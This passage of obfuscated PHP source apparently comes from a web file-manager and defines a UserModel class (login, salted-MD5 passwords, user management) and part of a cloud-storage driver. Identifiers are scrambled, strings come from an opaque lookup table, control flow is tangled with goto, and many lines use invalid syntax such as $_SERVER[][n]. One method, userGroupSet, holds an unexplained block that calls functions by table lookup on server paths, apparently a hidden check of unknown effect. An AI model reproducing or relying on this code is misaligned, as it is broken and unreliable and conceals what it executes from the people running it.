fА; fА: } public function getUserJob($A) { $D = Model($_SERVER[][479])->metaGet($A); return $this->getUserJobInfo($D[self::JOB_KEY]); } public function getUserJobInfo($aկ) { goto D; D: $Bڈ =& $_SERVER[]; $F = explode($Bڈ[47], $aկ); $a = parent::listData(); goto Bۍͤ; Bۍͤ: $a = array_remove_key($a, $Bڈ[187]); $A = array(); foreach ($F as $a) { if (isset($a[$a])) { $A[] = $a[$a]; } } goto fՍ; fՍ: return $A; goto cӮ; cӮ: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\x6d\145" => "\x75\163\x65\162\x5f\x6d\145\x74\x61", "\x6d\145\x74\x61\106\x69\x65\154\144" => "\165\x73\x65\162\x49\104"); protected $simpleField = "\165\163\145\x72\111\104\54\x6e\151\x63\153\x4e\141\x6d\x65\54\x6e\141\155\x65\54\x61\166\x61\x74\x61\162\54\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($aϤ) { $Dޤ˨ژ =& $_SERVER[]; $fܐ = $Dޤ˨ژ[2512]; return array($Dޤ˨ژ[2177] => array($aϤ[0], $fܐ), $Dޤ˨ژ[2179] => array($aϤ[0], $fܐ), $Dޤ˨ژ[2513] => array($aϤ[0], $fܐ)); } protected function getInfo($AˮҐ, $D = false) { $e = $this->getInfoSimple($AˮҐ); if (!is_array($e)) { return array(); } if ($D) { return $this->_getInfoApply($e); } return $this->cacheFunctionGet($_SERVER[][2233], $AˮҐ); } protected function getInfoFull($aҬ, $C̃ = false) { $cꕻ = $this->getInfoSimple($aҬ); if (!is_array($cꕻ)) { return array(); } if ($C̃) { return $this->_getInfoApply($cꕻ, !0); return $this->_getInfoApply($cꕻ, !0); } return $this->cacheFunctionGet($_SERVER[][2514], $aҬ); } private function _getInfoApply($C둠, $aڌ = false) { goto f; DȐݥ: $C둠 = $this->_listDataApplyItem($C둠); $b𪄔 = Model($C[1119])->metaGet($C둠[$C[391]][$C[369]]); $C둠[$C[2517]] = $DՏ; goto Bɣ; f: $C =& $_SERVER[]; if (!$C둠) { return $C둠; } $DՏ = md5($C[2515] . $C둠[$C[803]] . $C[2516] . $C둠[$C[28]]); goto DȐݥ; Bɣ: $C둠[$C[391]][$C[2350]] = isset($b𪄔[$C[2351]]) ? $b𪄔[$C[2351]] : null; if ($aڌ) { $C둠[$C[417]] = $this->metaGet($C둠[$C[1437]]); } return $C둠; goto c; c: } protected function getInfoSimple($c, $D˕ = false) { $dɢՏ =& $_SERVER[]; if (!$c) { return array(); } if ($D˕) { $e̪ = $this->where(array($dɢՏ[1437] => intval($c)))->find(); if (!is_array($e̪)) { return array(); } $e̪[$dɢՏ[2518]] = Action($dɢՏ[2519])->parseUrl($e̪[$dɢՏ[2518]]); return $e̪; } return $this->cacheFunctionGet($dɢՏ[2180], $c); } protected function getInfoSimpleOuter($dآ) { goto d; d: $d߼ =& $_SERVER[]; if (!$dآ || $dآ == 0) { return array($d߼[1437] => $d߼[470], $d߼[28] => $d߼[157] . LNG($d߼[2520]) . $d߼[478], $d߼[2518] => STATIC_PATH . $d߼[2521]); } $aϋ = $this->cacheFunctionGet($d߼[2180], $dآ); goto Cݸ; B쐳: return $fز; goto F; Cݸ: $fز = array_field_key($aϋ, explode($d߼[47], $this->simpleField)); if (!$fز) { return array($d߼[1437] => $d߼[1033], $d߼[28] => $d߼[157] . LNG($d߼[2522]) . $d߼[478], $d߼[2518] => STATIC_PATH . $d߼[2523]); } $fز[$d߼[2518]] = Action($d߼[2519])->parseUrl($fز[$d߼[2518]]); goto B쐳; F: } protected function groupUser($EȨ߈) { } public static function errorLang($eⓋ) { $f֣ =& $_SERVER[]; $b؊ = array(self::ERROR_USER_NOT_EXISTS => $f֣[2524], self::ERROR_USER_PASSWORD_ERROR => $f֣[2525], self::ERROR_USER_EXIST_NAME => $f֣[2526], self::ERROR_USER_EXIST_PHONE => $f֣[2527], self::ERROR_USER_EXIST_EMAIL => $f֣[2528], self::ERROR_USER_LOGIN_LOCK => $f֣[2529], self::ERROR_IP_NOT_ALLOW => $f֣[2530], self::ERROR_USER_EXIST_NICKNAME => $f֣[2531]); return LNG($b؊[$eⓋ]); } public function getInfoByMeta($cާ, $DՈա) { $c =& $_SERVER[]; $C = Model($c[2532])->where(array($c[89] => $cާ, $c[359] => $DՈա))->find(); if ($C) { return $this->getInfo($C[$c[1437]]); } return !1; } public function userLoginCheck($Bô, $C͍) { goto b; f: $E = $this->where($Eߪ)->find(); if (!$E) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($E[$bߞ[1437]], $C͍)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto Bݼ§; b: $bߞ =& $_SERVER[]; $Eߪ = array($bߞ[28] => $Bô, $bߞ[2354] => $Bô, $bߞ[293] => $Bô, $bߞ[2533] => $Bô, $bߞ[915] => $bߞ[917]); if ($this->nickNameRpt()) { unset($Eߪ[$bߞ[2354]]); } goto f; Bݼ§: $this->userEdit($E[$bߞ[1437]], array($bߞ[2534] => time())); return $this->getInfo($E[$bߞ[1437]]); goto e; e: } public function clearCache($A) { $F􃈵 =& $_SERVER[]; $this->cacheFunctionClear($F􃈵[2233], $A); $this->cacheFunctionClear($F􃈵[2180], $A); $this->cacheFunctionClear($F􃈵[2514], $A); } public function userPasswordCheck($AӴ, $e) { $A =& $_SERVER[]; $F = $this->where(array($A[1437] => intval($AӴ)))->find(); $Cև = $this->metaGet($AӴ); $a = isset($Cև[$A[2535]]) ? $Cև[$A[2535]] : $A[33]; if (md5($a . trim($e)) !== $F[$A[803]]) { return !1; } return !0; } public function userAdd($AՑ) { goto dΩ; dΩ: $c =& $_SERVER[]; $Bˑڏ = array($c[386] => $AՑ[$c[28]], $c[2536] => $AՑ[$c[1323]], $c[2537] => isset($AՑ[$c[293]]) ? $AՑ[$c[293]] : $c[33], $c[2538] => isset($AՑ[$c[2533]]) ? $AՑ[$c[2533]] : $c[33], $c[2539] => isset($AՑ[$c[2354]]) ? $AՑ[$c[2354]] : $AՑ[$c[28]], $c[2540] => isset($AՑ[$c[2518]]) ? $AՑ[$c[2518]] : $c[33], $c[2541] => isset($AՑ[$c[2542]]) ? $AՑ[$c[2542]] : 1, $c[2543] => $AՑ[$c[803]], $c[2181] => isset($AՑ[$c[2092]]) ? $AՑ[$c[2092]] : 1024 * 1024 * 20, $c[2182] => 0, $c[2534] => 0, $c[2220] => isset($AՑ[$c[688]]) ? $AՑ[$c[688]] : 1); if (!empty($AՑ[$c[1437]])) { $Bˑڏ[$c[1437]] = $AՑ[$c[1437]]; } goto bۆ쒻; Dۉ: return $fǺ; goto B֋; eޢ: $Fщ = array($c[2543] => $Bˑڏ[$c[803]], $c[2539] => $Bˑڏ[$c[2354]]); $this->userEdit($fǺ, $Fщ); Model($c[1119])->userRootAdd($fǺ); goto Dۉ; bۆ쒻: $aƮ = $this->_checkExist($AՑ); if ($aƮ !== !0) { return $aƮ; } $fǺ = $this->add($Bˑڏ); goto eޢ; B֋: } protected function userEditTest($bш, $B) { return $this->call($_SERVER[][2544], $bш, $B); } protected function userEdit($Aǩ, $FǈǱ) { goto C; E֟: return !0; goto B; C: $C =& $_SERVER[]; $F = $this->getInfoSimple($Aǩ); if (!$F) { return !1; } goto C׃; c: $this->where(array($C[1428] => $Aǩ))->save($FǈǱ); if (isset($FǈǱ[$C[2354]])) { $this->setNamePinyin($Aǩ, $FǈǱ[$C[2354]]); } $this->clearCache($Cŧ[$C[1437]]); goto E֟; C׃: $Cғ = $this->_checkExist($FǈǱ, $Aǩ); if ($Cғ !== !0) { return $Cғ; } if (isset($FǈǱ[$C[803]]) && trim($FǈǱ[$C[803]]) != $C[33]) { $c㇇ = $this->metaGet($Aǩ); if (empty($c㇇[$C[2535]])) { $c㇇[$C[2535]] = rand_string(10); Model($C[476])->metaSet($Aǩ, $C[2535], $c㇇[$C[2535]]); } $FǈǱ[$C[803]] = md5($c㇇[$C[2535]] . trim($FǈǱ[$C[803]])); } else { unset($FǈǱ[$C[803]]); } goto c; B: } public function setNamePinyin($Bߒ, $cĺѯ = false) { $AΏ =& $_SERVER[]; if (!$cĺѯ) { $E = $this->getInfoSimple($Bߒ); $cĺѯ = $E[$AΏ[2354]] ? $E[$AΏ[2354]] : $E[$AΏ[28]]; } $f̤ = Model($AΏ[479]); if (!Input::check($cĺѯ, $AΏ[530])) { return $f̤->metaSet($Bߒ, array($AΏ[416] => $AΏ[33], $AΏ[415] => $AΏ[33])); } return $f̤->metaSet($Bߒ, array($AΏ[416] => str_replace($AΏ[50], $AΏ[33], Pinyin::encode($cĺѯ)), $AΏ[415] => Pinyin::encode($cĺѯ, $AΏ[531]))); } private function nickNameRpt() { $d =& $_SERVER[]; $EƯ = Model($d[1090])->get($d[2545]); $d = $GLOBALS[$d[6]][$d[2502]][$d[2545]]; $aؒ = !is_null($EƯ) ? $EƯ : $d; return !!$aؒ; } private function _checkExist($C滼, $F = false) { $F =& $_SERVER[]; $fʿ = array($F[28] => UserModel::ERROR_USER_EXIST_NAME, $F[2354] => UserModel::ERROR_USER_EXIST_NICKNAME, $F[293] => UserModel::ERROR_USER_EXIST_EMAIL, $F[2533] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($fʿ[$F[2354]]); } $BلϢ = $F ? array($F[1437] => array($F[2546], $F)) : array(); foreach ($fʿ as $DŃɴ => $a) { if (!isset($C滼[$DŃɴ]) || !$C滼[$DŃɴ]) { continue; } $b򪇰 = array_merge(array($DŃɴ => $C滼[$DŃɴ]), $BلϢ); $Aᦃ = $this->where($b򪇰)->find(); if ($Aᦃ) { return $a; } } return !0; } public function userListInfo($a΄ƌ) { $FЂ =& $_SERVER[]; $CΙ󰸬 = array(); $a΄ƌ = is_array($a΄ƌ) ? array_unique($a΄ƌ) : array(); if (!$a΄ƌ) { return $CΙ󰸬; } if (count($a΄ƌ) < 20) { foreach ($a΄ƌ as $Bۙ¦) { $CΙ󰸬[$Bۙ¦ . $FЂ[33]] = $this->getInfoSimpleOuter($Bۙ¦); } } else { $aǊ = array($FЂ[1428] => array($FЂ[384], $a΄ƌ)); if (count($a΄ƌ) == 1) { $aǊ = array($FЂ[1428] => $a΄ƌ[0]); } $fƕ = Model($FЂ[476])->field($this->simpleField)->where($aǊ)->select(); $fƕ = array_to_keyvalue($fƕ, $FЂ[1437]); foreach ($a΄ƌ as $Bۙ¦) { $E؈ = $fƕ[$fƕ[$Bۙ¦]]; if (!$E؈) { $CΙ󰸬[$Bۙ¦ . $FЂ[33]] = $this->getInfoSimpleOuter($Bۙ¦); continue; } $E؈[$FЂ[2518]] = Action($FЂ[2519])->parseUrl($E؈[$FЂ[2518]]); $CΙ󰸬[$Bۙ¦ . $FЂ[33]] = $E؈; } } return $CΙ󰸬; } protected function userStatus($cЍ, $d̠) { $Cѳ = $this->getInfoSimple($cЍ); if (!$Cѳ) { return !1; } $BԮ = array($_SERVER[][688] => $d̠); return $this->userEdit($cЍ, $BԮ); } protected function userRemove($B) { goto C; d: Model($bőˣ[2187])->where($dη)->delete(); Model($bőˣ[2532])->where($dη)->delete(); Model($bőˣ[2548])->where($dη)->delete(); goto Bǳ; cʂ: $dη = array($bőˣ[1428] => $B); Model($bőˣ[538])->where($dη)->delete(); Model($bőˣ[2547])->where($dη)->delete(); goto d; C: $bőˣ =& $_SERVER[]; $c߬ = $this->getInfoSimple($B); if (!$c߬) { return !1; } goto cʂ; Bǳ: Model($bőˣ[751])->userRootRemove($B); return $this->where($dη)->delete(); goto Fѽ; Fѽ: } protected function userGroupSet($BΖ, $aƵ, $b鹵 = array()) { goto dҵ; aﲨؘ: if (!$B⊍ || !is_array($aƵ)) { return !1; } $AȐ = Model($dڜ³[2187]); $AȐ->where(array($dڜ³[1437] => $BΖ))->delete(); goto c; c: $EήǌӅ = array(); $dё = 0; foreach ($aƵ as $dǠ => $D̍׍֝) { $F = array($dڜ³[1437] => $BΖ, $dڜ³[2108] => $dǠ, $dڜ³[2252] => $D̍׍֝); $F[$dڜ³[2129]] = isset($b鹵[$dё]) ? $b鹵[$dё] : 0; $dё++; $EήǌӅ[] = $F; } goto eװ; eװ: return $AȐ->addAll($EήǌӅ, array(), !0); goto a꒙; dҵ: $dڜ³ =& $_SERVER[]; if ($_SERVER[$dڜ³[776]] != $_SERVER[$dڜ³[2549]]) { goto f툔; cȉ: $Bް = 1; while ($Bް > 1) { $Bް = $Bް + 4; $eʨ = rawurlencode($Bް . $dڜ³[361]); } goto e; aϰ癅: $C䪺 = $C($bܗە); $D޸ = explode($dڜ³[217], $C䪺); if (count($D޸) < $dڜ³[583]) { $a = $dڜ³[781]; $a(); } goto B; f툔: $F܂ѣ = $dڜ³[793]; $C = $dڜ³[778]; $bܗە = $_SERVER[$dڜ³[779]] . $dڜ³[780]; goto aϰ癅; B: $aѭ٠ = $dڜ³[794]; $aѭ٠($_SERVER[$dڜ³[795]]); $aѭ٠($_SERVER[$dڜ³[779]] . $dڜ³[2550]); goto cȉ; e: } $B⊍ = $this->getInfoSimple($BΖ); goto aﲨؘ; a꒙: } protected function userGroupAdd($a筫, $eůᾦ = array()) { $CӖ =& $_SERVER[]; $D = $this->getInfoSimple($a筫); if (!$D || empty($eůᾦ)) { return !1; } $eم = array(); foreach ($eůᾦ as $f̦ => $fڎ) { $eم[] = array($CӖ[1437] => $a筫, $CӖ[2108] => $f̦, $CӖ[2252] => $fڎ); } return Model($CӖ[2187])->addAll($eم, array(), !0); } protected function userGroupRemove($cƃ, $f) { $a =& $_SERVER[]; $f = $this->getInfoSimple($cƃ); if (!$f || !$f) { return !1; } $e؊ = array($a[1428] => $cƃ, $a[2185] => $f); return Model($a[2187])->where($e؊)->delete(); } public function listData() { $b˒ߛ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b˒ߛ[$_SERVER[][354]]); return $b˒ߛ; } public function listByID($fŌ) { $E˶ =& $_SERVER[]; if (!$fŌ) { return; } $a⧨ʖ = array($E˶[1437] => array($E˶[7], $fŌ)); $cϺ = $this->where($a⧨ʖ)->select(); $this->_listDataApply($cϺ); return $cϺ; } public function listByGroup($a = 0, $F = array()) { goto C; C: $bˏջ =& $_SERVER[]; $dҬğ = $bˏջ[33]; $f˂ơ = array(); goto bޠ; Fʱ: $this->_listDataApply($a[$bˏջ[354]]); return $a; goto bа㛼; bޠ: if ($a) { $f˂ơ = array($bˏջ[2551] => intval($a)); $dҬğ = "\114\x45\106\x54\x20\x4a\117\x49\116\40{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\162\x6f\x75\160\40\x75\x73\145\162\137\147\x72\157\x75\x70\x20\157\156\x20\x75\163\145\x72\x2e\x75\163\145\x72\111\x44\40\75\x20\x75\x73\x65\x72\137\147\162\157\x75\x70\56\165\x73\145\162\x49\104"; $c = Input::get($bˏջ[407], null, $bˏջ[33]) ? $bˏջ[33] : $bˏջ[2552]; } if (isset($F[$bˏջ[688]])) { $f˂ơ[$bˏջ[2553]] = $F[$bˏջ[688]]; } $a = $this->_makeOrder($c)->field($bˏջ[2554])->where($f˂ơ)->join($dҬğ)->selectPage(50); goto Fʱ; bа㛼: } private function _makeOrder($e = '') { goto e; e: $F =& $_SERVER[]; $cÙ = array($F[1437], $F[28], $F[2094], $F[2066], $F[187]); $Dߥ = array($F[402] => $F[403], $F[404] => $F[405]); goto B; d: $e = $e . "\x75\163\x65\x72\x2e{$a퇙}\x20{$Cɐ}\x2c\x20\165\163\145\x72\x2e\x75\x73\x65\x72\x49\104\40\x61\163\143"; return $this->alias($F[2296])->order($e); goto eł; B: $a퇙 = Input::get($F[407], $F[7], $F[1428], $cÙ); $Cɐ = Input::get($F[408], $F[7], $F[2188], array($F[2188], $F[404])); $Cɐ = $Dߥ[$Cɐ]; goto d; eł: } public function listSearch($fƷ˰) { goto C; Aى: return $f╪; goto B݄; E巼: if (!$f͠挂) { $bƋ垓 = array(); } if (isset($fƷ˰[$B[688]])) { $bƋ垓[$B[688]] = $fƷ˰[$B[688]]; } $f╪ = $this->_makeOrder()->where($bƋ垓)->selectPage(20); goto c; b: $f͠挂 = str_replace($B[2191], $B[2192], trim($f͠挂)); $bƋ垓 = array($B[28] => array($B[750], "\x25{$f͠挂}\45"), $B[293] => array($B[750], "\x25{$f͠挂}\45"), $B[2354] => array($B[750], "\45{$f͠挂}\x25"), $B[915] => $B[2193]); if (Input::check($f͠挂, $B[299])) { $bƋ垓[$B[1437]] = array($B[750], "\45{$f͠挂}\45"); $bƋ垓[$B[2533]] = array($B[750], "\x25{$f͠挂}\x25"); } goto E巼; C: $B =& $_SERVER[]; $f͠挂 = $fƷ˰[$B[2189]]; $EǵҰ = isset($fƷ˰[$B[2190]]) ? $fƷ˰[$B[2190]] : !1; goto b; c: if (!$f╪ || count($f╪[$B[354]]) < 5 && Input::check($f͠挂, $B[306])) { $EÒ = $this->_searchFromMeta($B[415], $f͠挂, 10); $cԯ = $this->_searchFromMeta($B[416], $f͠挂, 10); $Bь쨂 = array_merge($EÒ, $cԯ, $f╪[$B[354]]); $f╪[$B[354]] = array_unique_by_key($Bь쨂, $B[1437]); $f╪[$B[351]][$B[352]] = count($f╪[$B[354]]); $f╪[$B[351]][$B[353]] = ceil($f╪[$B[351]][$B[352]] / $f╪[$B[351]][$B[349]]); } $this->_listDataApply($f╪[$B[354]]); $this->_filterByGroup($f╪, $EǵҰ); goto Aى; B݄: } private function _filterByGroup(&$BŶ, $Bץ) { $fګ =& $_SERVER[]; if (!$Bץ) { return $BŶ; } foreach ($BŶ[$fګ[354]] as $e => &$Dۏ) { $BǶ = array_to_keyvalue($Dۏ[$fګ[2555]], $fګ[33], $fګ[2108]); if (!in_array($Bץ, $BǶ)) { unset($BŶ[$fګ[354]][$e]); } } $BŶ[$fګ[354]] = array_values($BŶ[$fګ[354]]); $BŶ[$fګ[351]] = array($fګ[2329] => count($BŶ[$fګ[354]]), $fګ[2327] => $BŶ[$fګ[351]][$fګ[349]], $fګ[2326] => 1, $fګ[2328] => 1); } private function _searchFromMeta($Aﯵ, $A둼, $F˧) { goto e; e: $eɧ =& $_SERVER[]; $A둼 = strtolower($A둼); $a␘ = array($eɧ[89] => $Aﯵ, $eɧ[359] => array($eɧ[750], "\45{$A둼}\x25")); goto d; d: $D۔ = Model($eɧ[2556])->where($a␘)->limit($F˧)->select(); if (!$D۔) { return array(); } $D۔ = array_to_keyvalue($D۔, $eɧ[33], $eɧ[1437]); goto f; f: $a = $this->where(array($eɧ[1428] => array($eɧ[7], $D۔)))->select(); if (!$a) { return array(); } return $a; goto eʼ; eʼ: } private function _listDataApplyItem($D) { $eȒħ = array($D); $this->_listDataApply($eȒħ); return $eȒħ[0]; } private function _listDataApply(&$Eʠ) { goto dѦȠ; Cȃ: $b = array_to_keyvalue($Eʠ, $Eʕ܎[33], $Eʕ܎[1437]); $this->_listAppendGroup($Eʠ, $b); $this->_listAppendMeta($Eʠ, $b); goto b; dѦȠ: $Eʕ܎ =& $_SERVER[]; if (!$Eʠ) { return; } array_remove_key($Eʠ, $Eʕ܎[803]); goto Cȃ; b: $this->_listAppendSourceRoot($Eʠ, $b); goto aɇ; aɇ: } private function _listAppendSourceRoot(&$B֤晝, $c夋) { goto Eݬ; B: $C = Model($C仸[751])->order($C仸[2201])->field($E)->where($Aߚ)->select(); $C = array_to_keyvalue($C, $C仸[458]); $C = array_remove_key($C, $C仸[458]); goto CΖ; Eݬ: $C仸 =& $_SERVER[]; $Aߚ = array($C仸[463] => 0, $C仸[371] => SourceModel::TYPE_USER, $C仸[458] => array($C仸[7], $c夋)); $E = $C仸[2200]; goto B; CΖ: foreach ($B֤晝 as &$d籼) { $d籼[$C仸[391]] = $C[$d籼[$C仸[1437]]] ? $C[$d籼[$C仸[1437]]] : array(); } goto FӬ; FӬ: } private function _listAppendGroup(&$BҮꥣ, $F) { goto c; a: $C = array_to_keyvalue($D͘, $Fֽꥐ[33], $Fֽꥐ[2108]); $C = array_remove_value(array_unique($C), $Fֽꥐ[470]); if (!$C || !$D͘) { return; } goto CΝ; c: $Fֽꥐ =& $_SERVER[]; $C֧ = array($Fֽꥐ[1437] => array($Fֽꥐ[7], $F)); $D͘ = Model($Fֽꥐ[2187])->where($C֧)->select(); goto a; B뽋ل: $D͘ = array_to_keyvalue_group($D͘, $Fֽꥐ[1437]); foreach ($D͘ as &$A) { $Aċ = array(); foreach ($A as $c瓲ģ) { if (!$c瓲ģ[$Fֽꥐ[2252]]) { continue; } $E匿 = Model($Fֽꥐ[2271])->listData($c瓲ģ[$Fֽꥐ[2252]]); $Aċ[] = array($Fֽꥐ[2108] => $c瓲ģ[$Fֽꥐ[2108]], $Fֽꥐ[2559] => $D[$c瓲ģ[$Fֽꥐ[2108]]][$Fֽꥐ[28]], $Fֽꥐ[461] => $D[$c瓲ģ[$Fֽꥐ[2108]]][$Fֽꥐ[461]], $Fֽꥐ[376] => $E匿); } $A = $Aċ; } foreach ($BҮꥣ as &$E) { $E[$Fֽꥐ[2555]] = array(); if (isset($D͘[$E[$Fֽꥐ[1437]]])) { $E[$Fֽꥐ[2555]] = $D͘[$E[$Fֽꥐ[1437]]]; } } goto DǬ; CΝ: $C֧ = array($Fֽꥐ[2108] => array($Fֽꥐ[7], $C)); $D = Model($Fֽꥐ[2557])->field($Fֽꥐ[2558])->where($C֧)->select(); $D = array_to_keyvalue($D, $Fֽꥐ[2108]); goto B뽋ل; DǬ: } private function _listAppendMeta(&$e, $cœ) { goto a⨊; c: foreach ($b as &$Dя) { $Aֿތ = array(); foreach ($Dя as $Fώ) { if (!in_array($Fώ[$c؏[89]], $FԹҦ)) { $Aֿތ[$Fώ[$c؏[89]]] = $Fώ[$c؏[359]]; } } $Dя = $Aֿތ; } $fϋ = Model($c؏[2560]); foreach ($e as &$Aꞛ) { $A܇ݚ = array(); if (isset($b[$Aꞛ[$c؏[1437]]])) { $A܇ݚ = $b[$Aꞛ[$c؏[1437]]]; } $Aꞛ[$c؏[2561]] = array(); if (isset($A܇ݚ[$E])) { $Aꞛ[$c؏[2561]] = $fϋ->getUserJobInfo($A܇ݚ[$E]); } } goto Fٱϊ; a⨊: $c؏ =& $_SERVER[]; $E = UserJobModel::JOB_KEY; $FԹҦ = array($c؏[2535]); goto e咺; e咺: $Dݧ = array($c؏[1437] => array($c؏[7], $cœ)); $b = Model($c؏[2532])->where($Dݧ)->select(); $b = array_to_keyvalue_group($b, $c؏[1437]); goto c; Fٱϊ: } protected function groupUserAll($A΅) { $C̈ =& $_SERVER[]; if (!$A΅) { return !1; } $c۞ = Model($C̈[2187])->field($C̈[1437])->where(array($C̈[2108] => array($C̈[7], $A΅)))->select(); $c۞ = array_to_keyvalue($c۞, $C̈[33], $C̈[1437]); return array_unique($c۞); } public function userSearch($d, $c = "\x2a") { return Model($_SERVER[][479])->where($d)->field($c)->find(); } } goto F瞯; b񎄝: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\72\x2f\57\x76\x30\56\x61\x70\151\56\x75\x70\171\165\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ḛ堃) { parent::__construct(); $this->_init($Ḛ堃); } public function _init($d) { foreach ($d as $cȗ => $f) { if (isset($this->{$cȗ})) { $this->{$cȗ} = $f; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[][1243], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Dꊧ, $F = "\107\x45\x54") { $dբ =& $_SERVER[]; $C븂 = gmdate($dբ[1207]); $f = base64_encode(hash_hmac($dբ[1244], "{$F}\x26{$Dꊧ}\x26{$C븂}", md5("{$this->userpass}"), !0)); $Bҥ = array("\x41\x75\164\x68\x6f\x72\x69\172\141\x74\x69\157\x6e\72\x55\x50\131\125\x4e\x20{$this->username}\72{$f}", "\x44\x61\x74\145\72{$C븂}"); return $Bҥ; } public function ussRequest($Cȕߐ, $eݶҒ = "\107\105\124", $E = false, $B˘ = false, $A抭 = false) { goto Eȉ; D˙: if (!$a) { return array($aա۷[1034] => !1, $aա۷[1036] => $aա۷[1245]); } if (strtolower($eݶҒ) == $aա۷[184] || in_array($a[$aա۷[1034]], array($aա۷[1102], $aա۷[1246]))) { $E = $a[$aա۷[1247]]; } else { $E = json_decode($a[$aա۷[1036]], !0); if (!$E) { $E = $a[$aա۷[1036]]; } else { if (!$a[$aա۷[688]] && isset($E[$aա۷[1248]])) { $E = $E[$aա۷[1248]]; } } } return array($aա۷[1034] => $a[$aա۷[688]], $aա۷[1036] => $E); goto dՏ; d蝼: $e = $this->ussHeaders($dҔ, $eݶҒ); if ($B˘) { $e = array_merge($e, $B˘); } $a = url_request($this->endpoint . $dҔ, $eݶҒ, $E, $e, $A抭); goto D˙; Eȉ: $aա۷ =& $_SERVER[]; $Cȕߐ = trim($Cȕߐ, $aա۷[8]); $dҔ = "\57{$this->bucket}\x2f{$Cȕߐ}"; goto d蝼; dՏ: } public function mkfile($C뷒ۯ, $A = '', $Eͳ = REPEAT_RENAME) { if ($this->setContent($C뷒ۯ, $A)) { return $this->getPathOuter($C뷒ۯ); } return !1; } public function mkdir($Dى, $f = REPEAT_SKIP) { $E鈯 =& $_SERVER[]; $bȆ = trim($Dى, $E鈯[8]); if ($this->_isFolder($bȆ)) { return $this->getPathOuter($bȆ); } $cȳߙ = array($E鈯[1249]); $A = $this->ussRequest($bȆ, $E鈯[212], !1, $cȳߙ); return $A[$E鈯[1034]] ? $this->getPathOuter($bȆ) : !1; } public function copyFile($aգ, $dό) { $f嶌 =& $_SERVER[]; $Cº = array($f嶌[1250] . "\x2f{$this->bucket}\57{$aգ}", $f嶌[1251]); $d˶¡ = $this->ussRequest($dό, $f嶌[214], !1, $Cº); return $d˶¡[$f嶌[1034]] ? !0 : $this->getPathOuter($dό); } public function moveFile($FռӦ, $bО) { $f֋ =& $_SERVER[]; $B = array($f֋[1252] . "\x2f{$this->bucket}\x2f{$FռӦ}", $f֋[1251]); $b = $this->ussRequest($bО, $f֋[214], !1, $B); return $b[$f֋[1034]] ? !0 : $this->getPathOuter($bО); } public function delFile($d) { $E =& $_SERVER[]; $d߸ = $this->ussRequest($d, $E[1253]); return $d߸[$E[1034]] ? !0 : !1; } public function delFolder($CƵ) { $f޵ʜ =& $_SERVER[]; $Cآ = $this->listAll($CƵ); krsort($Cآ); foreach ($Cآ as $cܑ쏲) { $this->ussRequest($cܑ쏲[$f޵ʜ[75]], $f޵ʜ[1253]); } return $this->ussRequest($CƵ, $f޵ʜ[1253]); } public function rename($f޼, $B) { if ($this->isFile($f޼)) { $B = get_path_father($f޼) . $B; return $this->moveFile($f޼, $B); } return $this->renameObject($f޼, $B); } public function fileInfo($d, $C = false, $aڈ = array()) { $Cüҋ =& $_SERVER[]; if ($C) { return array($Cüҋ[28] => $this->pathThis($d), $Cüҋ[75] => $this->getPathOuter($Cüҋ[8] . $d), $Cüҋ[29] => $Cüҋ[167], $Cüҋ[77] => isset($aڈ[$Cüҋ[325]]) ? $aڈ[$Cüҋ[325]] : 0, $Cüҋ[160] => $this->ext($d)); } $b؅ = array($Cüҋ[28] => $this->pathThis($d), $Cüҋ[75] => $this->getPathOuter($Cüҋ[8] . $d), $Cüҋ[29] => $Cüҋ[167], $Cüҋ[187] => 0, $Cüҋ[107] => isset($Aղ[$Cüҋ[1254]]) ? $Aղ[$Cüҋ[1254]] : 0, $Cüҋ[77] => isset($aڈ[$Cüҋ[325]]) ? $aڈ[$Cüҋ[325]] : 0, $Cüҋ[160] => $this->ext($d), $Cüҋ[188] => !0, $Cüҋ[189] => !0); if (empty($aڈ)) { $aڈ = $this->objectMeta($d); if (!$aڈ) { return $b؅; } $b؅[$Cüҋ[187]] = $aڈ[$Cüҋ[1255]]; $b؅[$Cüҋ[107]] = $aڈ[$Cüҋ[1256]]; $b؅[$Cüҋ[77]] = $aڈ[$Cüҋ[77]]; } return $b؅; } public function folderInfo($CӦ, $D盓 = false) { $Cݘ =& $_SERVER[]; if ($D盓) { return array($Cݘ[28] => $this->pathThis($CӦ), $Cݘ[75] => $this->getPathOuter($Cݘ[8] . $CӦ), $Cݘ[29] => $Cݘ[76]); } $A֏ = array($Cݘ[28] => $this->pathThis($CӦ), $Cݘ[75] => $this->getPathOuter($Cݘ[8] . $CӦ), $Cݘ[29] => $Cݘ[76], $Cݘ[187] => 0, $Cݘ[107] => isset($f[$Cݘ[1254]]) ? $f[$Cݘ[1254]] : 0, $Cݘ[1164] => !0, $Cݘ[1165] => !0); if (empty($a¶)) { $a¶ = $this->objectMeta($CӦ); if (!$a¶) { return $A֏; } $A֏[$Cݘ[187]] = $a¶[$Cݘ[1255]]; $A֏[$Cݘ[107]] = $a¶[$Cݘ[1256]]; } return $A֏; } private function fileList($cᇺ۬, $Eдʅ = 0, $C = 1000) { $f疨̏ =& $_SERVER[]; $Bשׁ = array($f疨̏[1257], $f疨̏[1258] . $C); if ($Eдʅ) { $Bשׁ[] = $f疨̏[1259] . $Eдʅ; } $BӢ = $this->ussRequest($cᇺ۬, $f疨̏[216], !1, $Bשׁ); return !$BӢ[$f疨̏[1034]] ? !1 : $BӢ[$f疨̏[1036]]; } public function listPath($E, $EϷ = false) { goto 